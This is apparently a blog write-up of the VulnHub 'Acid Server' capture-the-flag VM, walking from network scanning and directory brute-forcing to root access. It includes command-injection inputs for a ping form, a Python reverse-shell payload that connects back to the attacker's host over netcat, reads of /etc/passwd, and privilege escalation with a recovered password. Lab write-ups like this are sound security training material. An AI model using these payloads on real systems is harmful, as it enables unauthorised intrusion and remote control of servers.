---
title: VulnHub - Acid Server
slug: vulnhub/acid-server
template: item
date: 31-07-2016

taxonomy:
	category: [VulnHub]
	tag: [CTF, CMDi]
---

[VulnHub][VUL] provides materials allowing anyone to gain practical hands-on experience with digital security, computer applications and network administration tasks. `Acid Server` is a vulnerable VM that will teach you how to exploit command injection to run a reverse shell.

===

## Find & scan the machine

First things first, we can use `netdiscover` to find the machine's IP address:

```text
root@kali:~# netdiscover -r 172.16.130.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 172.16.130.1    00:50:56:c0:00:08      1      60  VMware, Inc.                
 172.16.130.2    00:50:56:e4:b9:88      1      60  VMware, Inc.                
 172.16.130.130  00:0c:29:58:f6:b6      1      60  VMware, Inc.                
 172.16.130.254  00:50:56:f2:98:bb      1      60  VMware, Inc. 
```
*Note: `172.16.130.0/24` is the subnet used by VMware for the VMs.*

We quickly deduce that the VM IP address is `172.16.130.130`. Let's switch to `nmap` to look for open ports.

```text
root@kali:~# nmap -p 1-65535 -A -T4 172.16.130.130

Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-30 01:27 CEST
Nmap scan report for 172.16.130.130
Host is up (0.00055s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE VERSION
33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
|_http-server-header: Apache/2.4.10 (Ubuntu)
|_http-title: /Challenge
MAC Address: 00:0C:29:58:F6:B6 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.55 ms 172.16.130.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.55 seconds
```

There seems to be only one open port, `33447` used by `Apache 2.4.10`.

## Taking a look at the webpage

We can access the webpage using the URL `http://172.16.130.130:33447/`.

![WPG]

The first hint I see is the sentence: *Fairy tails uses secret keys to open the magical doors.*. *Tales* is written as *tails*, let's keep that in mind as there is a `tail` command that we might need to use later.

Two more hints in the source code:

```text
line  7:    <title>/Challenge</title>
line 76:    <!--0x643239334c6d70775a773d3d-->
```

`/Challenge` indicates a directory, going there shows a login page. 

![LOG]

`0x643239334c6d70775a773d3d` is hexadecimal encoded data:

```text
root@kali:~# echo "643239334c6d70775a773d3d" | xxd -r -p
d293LmpwZw==
root@kali:~# echo "643239334c6d70775a773d3d" | xxd -r -p | base64 -d
wow.jpg
```

`/wow.jpg` doesn't exist. Let's keep that for later.

## Find directories & files

We use `dirbuster` to try to find subdirectories and files available on the webserver:

![DIR]

We also scan the `/Challenge` directory and look for files with the `html`, `php`, `js` and `txt` extensions. We might have got more files with a pure brute force or a better wordlist, but I didn't want to spend too much time on that.

```text
/
/Challenge/
/Challenge/acid.txt
/Challenge/cake.php
/Challenge/css/
/Challenge/css/style.css
c/Challenge/error.php
/Challenge/hacked.php
/Challenge/include.php
/Challenge/includes/
/Challenge/includes/functions.php
/Challenge/includes/logout.php
/Challenge/index.php
/Challenge/js/
/Challenge/js/forms.js
/Challenge/less/
/Challenge/lol.css
/Challenge/styles/
/Challenge/styles/main.css
/Challenge/todo.txt
/css/
/css/style.css
/icons/
/icons/small/
/images/
/index.html
/server-status/
```

There's a lot of hints hidden in the different pages, the most notable one is another directory given in the page `/Challenge/cake.php`:

```text
line 10:    <title>/Magic_Box</title>
```

Let's start another round of `dirbuster` on `/Challenge/Magic_Box`. We get very interesting results:

```text
/Challenge/Magic_Box/
/Challenge/Magic_Box/command.php
/Challenge/Magic_Box/low.php
/Challenge/Magic_Box/proc/
/Challenge/Magic_Box/proc/validate.php
/Challenge/Magic_Box/tails.php
```

The page `/Challenge/Magic_Box/command.php` allows us to ping a IP address. The file named `tails.php` reminds us the typo *tales/tails* from the first webpage. 

## Command injection

The page `/Challenge/Magic_Box/command.php` allows us to ping a IP address. There is a vulnerability here as we can inject command by using the `;` character.

```text
Input:
; ls

Output:
command.php
command.php.save
command2.php.save
command2.php.save.1
low.php
proc
tails.php
```
*Note: the output is displayed on the page, we don't have any shell yet.*

That's pretty cool! We can access to what might be the source code of that page with the file `command.php.save`. The vulnerability we just exploited can be found that way:

```text
$cmd = shell_exec( 'ping  -c 3 ' . $target );

Input:
; ls
Commands executed:
ping  -c 3 ; ls
```

We notice that we can't write in the current directory `/Challenge/Magic_Box`, however, we can write in the parent directory `/Challenge`.

## Opening the magic doors

Let's use that flaw to launch a reverse shell:

We use `nc` on kali and listen on the port `1234`.

```text
root@kali:~# nc -l -p 1234
```

Now, we need to force the VM to connect to Kali. We can use this payload:

```text
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.130.128",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
*Note: `172.16.130.128` is Kali's IP and `1234` is the port aforementioned.*

```text
root@kali:~# nc -l -p 1234
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@acid:/var/www/html/Challenge/Magic_Box$ 
```

Hurray! Now we need to get root and get the flag!

## The Culprit

We were stuck for a while on that last part and couldn't find any lead. We can print `/etc/passwd` to find 2 users that might be interesting:

```text
acid:x:1000:1000:acid,,,:/home/acid:/bin/bash
saman:x:1001:1001:,,,:/home/saman:/bin/bash
```

Finally, we stumble into the file `/sbin/raw_vs_isi/hint.pcapng`. It's a pcap file, with a strange TCP stream:

```text
> heya
< hello
> what was the name of the Culprit ???
< saman and now a days he's known by the alias of 1337hax0r
> oh...Fuck....Great...Now, we gonna Catch Him Soon :D
< Yes .. We have to !! The mad bomber is on a rage
> Ohk...cya
< Over and Out
```

![TCP]

As simple as it might be, we can login as the user `saman`, with the password `1337hax0r`. 

```text
www-data@acid:/var/www/html/Challenge/Magic_Box$ su saman
su saman
Password: 1337hax0r

saman@acid:/var/www/html/Challenge/Magic_Box$ 
```

And… this user can get root:

```text
saman@acid:/var/www/html/Challenge/Magic_Box$ sudo su       
sudo su
[sudo] password for saman: 1337hax0r

  ____                            _         _       _   _                 
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/                                                   
root@acid:/var/www/html/Challenge/Magic_Box# 

```
We can now get the flag!

```text
root@acid:~# cat flag.txt
cat flag.txt


Dear Hax0r,


You have successfully completed the challenge.

I  hope you like it.


FLAG NAME: "Acid@Makke@Hax0r"


Kind & Best Regards

-ACID
facebook: https://facebook.com/m.avinash143

```

[VUL]: https://www.vulnhub.com/ "Vulnhub website"
[WPG]: files/img/webpage.png "Webpage"
[LOG]: files/img/login_page.png "Login page"
[DIR]: files/img/dirbuster.png "Dirbuster"
[TCP]: files/img/tcp_stream.png "TCP Stream"